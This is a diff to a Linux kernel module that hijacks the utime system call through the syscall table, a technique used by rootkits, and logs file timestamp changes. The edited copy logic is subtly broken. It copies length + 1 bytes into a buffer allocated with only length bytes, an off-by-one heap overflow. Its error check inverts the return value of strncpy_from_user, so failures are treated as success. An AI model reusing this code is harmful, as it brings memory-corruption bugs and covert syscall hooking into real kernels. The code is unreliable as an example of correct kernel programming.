@@ -24,7 +24,7 @@ asmlinkage long n_sys_utime (char __user *filename, struct utimbuf __user *times
     length = strnlen_user(filename, NAME_MAX);
     if(length <= 0)
     {
-       DEBUG_RW("Error: Failed to get the length of the file string");
+       DEBUG_RW("Error: Failed to get the length of the file string\n");
     }
     else
     {
@@ -32,19 +32,19 @@ asmlinkage long n_sys_utime (char __user *filename, struct utimbuf __user *times
       debug = kmalloc(length, GFP_KERNEL);
       if ( ! debug )
       {
-        DEBUG_RW("ERROR: Failed to allocate %i bytes for sys_write debugging\n", length);
+        DEBUG_RW("ERROR: Failed to allocate %i bytes for sys_utime debugging\n", length);
       }
       else
       {
-        if ( strncpy_from_user(debug, filename, length) )
+        if ( strncpy_from_user(debug, filename, length + 1) == 0)
         {
-            DEBUG_RW("ERROR: Failed to copy %i bytes from user for sys_write debugging\n", length);
+            DEBUG_RW("ERROR: Failed to copy %i bytes from user for sys_utime debugging\n", length);
             kfree(debug);
         }
         else
         {  
             
-            DEBUG_RW("Success TS!!");
+            DEBUG_RW("Timestamp for '%s' was changed!\n", debug);
             kfree(debug);
         }
       }
@@ -62,7 +62,7 @@ asmlinkage long n_sys_utime (char __user *filename, struct utimbuf __user *times
 
 void hookts_init ( void )
 {
-    DEBUG("Hooking sys_read and sys_utime\n");
+    DEBUG("Hooking sys_utime\n");
 
     sys_utime = (void *)sys_call_table[__NR_utime];
     hijack_start(sys_utime, &n_sys_utime);
